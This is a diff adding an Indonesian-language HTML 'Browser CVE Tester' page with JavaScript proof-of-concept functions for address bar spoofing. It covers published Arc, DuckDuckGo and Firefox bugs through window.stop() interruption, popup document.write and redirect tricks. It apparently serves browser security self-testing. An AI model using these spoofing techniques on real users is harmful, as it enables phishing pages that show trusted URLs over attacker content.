@@ -1,8 +1,203 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Browser CVE Tester: Address Bar Spoofing & Bypass</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f4f4f4;
+            color: #333;
+        }
+        h1 { color: #d32f2f; border-bottom: 2px solid #d32f2f; padding-bottom: 10px; }
+        .card {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            border-left: 5px solid #ff9800;
+        }
+        button {
+            background: #0078d7;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+            margin-right: 10px;
+            transition: 0.3s;
+        }
+        button:hover { background: #005a9e; }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        .code {
+            background: #1e1e1e;
+            color: #dcdcdc;
+            padding: 10px;
+            font-family: monospace;
+            font-size: 12px;
+            margin-top: 10px;
+            overflow-x: auto;
+            border-radius: 4px;
+        }
+        footer { text-align: center; margin-top: 30px; font-size: 12px; color: #777; }
+        hr { margin: 20px 0; }
+    </style>
+</head>
+<body>
+
+<h1>🔓 Real-world CVE Tester: Address Bar Spoofing</h1>
+<div class="warning">
+    <strong>⚠️ Disclaimer:</strong> Script untuk verifikasi kerentanan browser yang sudah dipublikasi (CVE). 
+    Tujuan: Memeriksa apakah browser modern Anda masih rentan terhadap bug lawas atau bypass tertentu.
+</div>
+
+<!-- Daftar CVE yang diuji -->
+<div class="card">
+    <h2>🧪 CVE-2024-25733: The Browser Company (Arc Browser - iOS/iPadOS)</h2>
+    <p><strong>Teknik:</strong> Memanfaatkan `window.stop()` dan port random untuk menginterupsi navigasi, sehingga URL berubah di bar address tapi konten tetap malicious.</p>
+    <button onclick="exploit_cve_2024_25733()">👉 Uji CVE-2024-25733 (Redirect Spoofing)</button>
+    <div id="log1" class="code">[Log] Klik tombol untuk memulai uji...</div>
+</div>
+
+<div class="card">
+    <h2>🔥 CVE-2021-44683: DuckDuckGo Browser (iOS) - window.open Spoofing</h2>
+    <p><strong>Teknik:</strong> Membuka window baru via JavaScript tanpa kendali yang tepat, memungkinkan konten attacker di URL yang tampak legitimate.</p>
+    <button onclick="exploit_cve_2021_44683()">👉 Uji CVE-2021-44683 (Popup Spoofing)</button>
+    <div id="log2" class="code">[Log] Klik tombol untuk memulai uji...</div>
+</div>
+
+<div class="card">
+    <h2>⏳ CVE-2024-11701 / GHSA-p9vw-xw86-3f2w: Firefox Interrupted Navigation</h2>
+    <p><strong>Teknik:</strong> Memaksa navigasi terinterupsi sehingga domain yang salah ditampilkan di address bar.</p>
+    <button onclick="exploit_cve_2024_11701()">👉 Uji CVE-2024-11701 (Firefox <133)</button>
+    <div id="log3" class="code">[Log] Klik tombol untuk memulai uji...</div>
+</div>
+
+<div class="card">
+    <h2>🔄 Open Redirect + Spoofing Simulation (CVE-2024-8897 Style - Android)</h2>
+    <p><strong>Teknik:</strong> Kombinasi redirect terbuka dengan delay untuk meniru spoofing (mirip bug Firefox for Android).</p>
+    <button onclick="exploit_open_redirect_spoof()">👉 Uji Open Redirect Spoof</button>
+    <div id="log4" class="code">[Log] Klik tombol untuk memulai uji...</div>
+</div>
+
 <script>
-document.getElementById('one').onclick = function() {
-myWindow=window.open('http://rafayhackingarticles.net/','RHA','width=300,height=300,location=yes');
-myWindow.document.write("<html><head></head><body><b>This page is still being hosted on rhainfosec.com, however the domain is pointing to rafayhackingarticles.net.</b><br><br><iframe src=\"http://www.rafayhackingarticles.net/\");></iframe></scri+pt></body></html>");
-myWindow.focus();
-return false;
-}
+    // Utility untuk menampilkan log di div masing-masing
+    function log(elementId, message) {
+        const el = document.getElementById(elementId);
+        if(el) {
+            el.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+        }
+    }
+
+    // 1. CVE-2024-25733: Arc Browser Spoofing (The Browser Company)
+    // Source: https://github.com/hackintoanetwork/ARC-Browser-Address-Bar-Spoofing-PoC [citation:5]
+    function exploit_cve_2024_25733() {
+        log('log1', '🚀 Menjalankan PoC: CVE-2024-25733...');
+        log('log1', '🔄 Mencoba menginterupsi navigasi ke google.com (dengan port random)');
+        
+        // PoC asli dari vulnerability report
+        setTimeout(() => {
+            window.stop(); // Hentikan loading halaman
+            let randomPort;
+            do {
+                randomPort = Math.floor(Math.random() * 1000);
+            } while (randomPort === 0 || randomPort === 443);
+            // Mencoba mengganti lokasi. Jika vulnerability masih ada, bar address berubah tapi konten tetap malicious site.
+            document.location = "https://www.google.com:" + randomPort + "/";
+            log('log1', '✅ Eksekusi selesai. Periksa Address Bar: apakah URL berubah menjadi google.com tetapi halaman ini tetap muncul? (Jika iya, masih rentan atau bypass berhasil)');
+        }, 300);
+    }
+
+    // 2. CVE-2021-44683: DuckDuckGo for iOS Spoofing
+    // Source: https://nvd.nist.gov/vuln/detail/CVE-2021-44683 [citation:10]
+    function exploit_cve_2021_44683() {
+        log('log2', '🪟 Membuka popup window dengan teknik window.open spoofing...');
+        // Membuka jendela baru dengan URL target (misal google) lalu menulis konten sendiri
+        let spoofWindow = window.open('https://www.google.com', '_blank', 'width=600,height=400');
+        if (spoofWindow) {
+            log('log2', '⚠️ Popup berhasil dibuka. Mencoba menulis konten malicious...');
+            setTimeout(() => {
+                try {
+                    // Mencoba overwrite konten di window baru. Ini biasanya dicegah oleh Same-Origin Policy jika browser sehat.
+                    spoofWindow.document.write('<h1>Halaman Palsu</h1><p>Jika Anda melihat ini di URL https://www.google.com, maka browser Anda rentan terhadap CVE-2021-44683.</p>');
+                    log('log2', '🔥 KONTEN BERHASIL DIWRITE! Browser Anda rentan terhadap spoofing window.open.');
+                } catch (e) {
+                    log('log2', '✅ Aman / Patched. Browser memblokir akses cross-origin: ' + e.message);
+                }
+            }, 1000);
+        } else {
+            log('log2', '🚫 Popup diblokir oleh browser. Coba izinkan popup untuk uji ini.');
+        }
+    }
+
+    // 3. CVE-2024-11701: Firefox Incorrect Domain Display
+    // Source: Mozilla Advisory [citation:4]
+    function exploit_cve_2024_11701() {
+        log('log3', '⏳ Memulai interrupted navigation simulation...');
+        log('log3', '🔗 Mencoba navigate ke "https://example.com" lalu menginterupsi dengan "javascript:void(0)"');
+        // Teknik: mulai navigasi lalu segera stop, sisakan URL yang salah di address bar
+        let originalUrl = window.location.href;
+        window.location.href = 'https://example.com';
+        setTimeout(() => {
+            window.stop();
+            // Kembalikan ke halaman ini tapi biarkan address bar mungkin stuck di example.com jika vulnerable
+            log('log3', '🛑 Navigasi dihentikan. Periksa address bar: apakah masih menunjukkan "example.com" meskipun konten kembali ke halaman ini? (Jika iya, bug ini masih ada di browser Anda).');
+            // Tidak bisa force reload tanpa trigger ulang, jadi manual
+        }, 100);
+        // Tidak mengubah document.location kembali agar user bisa lihat address bar
+        setTimeout(() => {
+            log('log3', '💡 Tips: Secara manual lihat address bar browser Anda. Apakah URL berubah menjadi "example.com" tapi konten halaman ini tidak berubah? Itu indikasi spoofing.');
+        }, 500);
+    }
+
+    // 4. Open Redirect + Spoofing (Mirip CVE-2024-8897 - Firefox for Android) [citation:2][citation:9]
+    function exploit_open_redirect_spoof() {
+        log('log4', '🔄 Mensimulasikan Open Redirect + Delay untuk Spoofing...');
+        log('log4', '↪️ Mencoba redirect ke "https://mozilla.org" dengan delay, lalu kembali...');
+        // Bug ini terjadi ketika ada redirect chain yang dimanipulasi
+        let maliciousUrl = window.location.href;
+        // Pindah ke trusted site dulu
+        window.location.href = 'https://www.mozilla.org/en-US/';
+        setTimeout(() => {
+            log('log4', '⏰ Delay selesai. Jika browser Anda membiarkan address bar stuck di mozilla.org setelah redirect kedua, itu indikasi spoofing.');
+            // Kembali lagi ke halaman ini dengan cepat? Tidak perlu, biarkan user analisa.
+            // User bisa klik back untuk lihat address bar tidak sinkron.
+        }, 2000);
+    }
+
+    // Info tambahan di console untuk analisis mendalam
+    console.log("CVE Tester Ready. Daftar CVE yang diuji:");
+    console.log("- CVE-2024-25733 (Arc Browser)");
+    console.log("- CVE-2021-44683 (DuckDuckGo)");
+    console.log("- CVE-2024-11701 (Firefox Interrupted Nav)");
+    console.log("- CVE-2024-8897 (Firefox Android Open Redirect)");
 </script>
+
+<hr>
+<h3>📋 Interpretasi Hasil:</h3>
+<ul>
+    <li><strong>Tidak Rentan (Patched)</strong>: Browser Anda menampilkan URL yang benar, atau memblokir manipulasi konten lintas domain (Same-Origin Policy berjalan baik), atau navigasi terinterupsi tidak mempengaruhi address bar.</li>
+    <li><strong>Rentan / Bypass Berhasil</strong>: Anda melihat konten bukti (misal "Halaman Palsu") dengan URL milik website lain (Google/Mozilla), atau address bar tidak sinkron dengan konten.</li>
+    <li><strong>Catatan</strong>: Beberapa bug ini sudah sangat tua dan sudah ditambal di versi browser mainstream terbaru. Namun, beberapa fork browser atau browser yang jarang update mungkin masih rentan.</li>
+</ul>
+
+<footer>
+    Dibuat untuk keperluan <strong>Verifikasi Keamanan Browser & Edukasi CVE</strong>. <br>
+    Referensi: NVD, CVE Details, GitHub Security Lab, Mozilla Bugzilla.
+</footer>
+</body>
+</html>
